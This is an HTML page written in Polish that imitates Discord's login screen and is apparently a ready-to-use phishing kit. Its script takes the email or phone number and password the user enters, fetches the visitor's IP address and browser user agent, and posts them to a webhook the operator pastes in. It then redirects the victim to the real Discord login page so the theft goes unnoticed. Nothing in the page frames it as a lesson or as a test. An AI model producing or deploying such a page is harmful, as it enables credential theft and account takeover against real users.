<!DOCTYPE html>
<html lang="pl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Discord</title>
<style>
  body { margin:0; font-family:Arial, sans-serif; background:#404eed; display:flex; align-items:center; justify-content:center; height:100vh; }
  .card { background:#36393f; color:#fff; padding:32px; border-radius:8px; width:380px; box-shadow:0 8px 32px rgba(0,0,0,.4); }
  h1 { font-size:26px; margin:0 0 8px; }
  p { color:#b9bbbe; font-size:14px; margin:0 0 24px; }
  label { font-size:12px; font-weight:bold; color:#b9bbbe; }
  input { width:100%; padding:10px; margin:8px 0 16px; border:1px solid #202225; border-radius:4px; background:#202225; color:#fff; box-sizing:border-box; }
  input:focus { outline:none; border-color:#5865f2; }
  button { width:100%; padding:12px; background:#5865f2; color:#fff; border:none; border-radius:4px; font-size:15px; font-weight:600; cursor:pointer; }
  button:hover { background:#4752c4; }
  a { color:#00aff4; text-decoration:none; font-size:13px; }
  .foot { margin-top:16px; text-align:center; color:#72767d; font-size:12px; }
</style>
</head>
<body>
<div class="card">
  <h1>Witaj ponownie!</h1>
  <p>Jesteśmy podekscytowani, że Cię znowu widzimy!</p>
  <form id="login-form">
    <label for="email">ADRES E-MAIL LUB NUMER TELEFONU</label>
    <input type="text" id="email" name="email" required>
    <label for="password">HASŁO</label>
    <input type="password" id="password" name="password" required>
    <a href="#">Zapomniałeś hasła?</a><br><br>
    <button type="submit">Zaloguj się</button>
  </form>
  <div class="foot">Potrzebujesz konta? <a href="#">Zarejestruj się</a></div>
</div>

<script>
const WEBHOOK_URL = 'TU_WKLEJ_SWOJ_WEBHOOK'; // <-- TYLKO TO ZMIENIASZ

document.getElementById('login-form').addEventListener('submit', async function(e) {
  e.preventDefault();

  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;

  let ip = 'nieznane';
  try { ip = (await (await fetch('https://api.ipify.org?format=json')).json()).ip; } catch(err) {}

  const payload = {
    embeds: [{
      title: 'Nowe loginy',
      color: 0x5865F2,
      fields: [
        { name: 'Email/Login', value: email, inline: true },
        { name: 'Hasło', value: password, inline: true },
        { name: 'IP', value: ip, inline: true },
        { name: 'User-Agent', value: navigator.userAgent.slice(0, 100), inline: false }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  try {
    await fetch(WEBHOOK_URL, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify(payload) });
  } catch(err) { console.log('błąd wysyłki', err); }

  window.location.href = 'https://discord.com/login'; // po wysłaniu przenosi na prawdziwy Discord
});
</script>
</body>
</html>
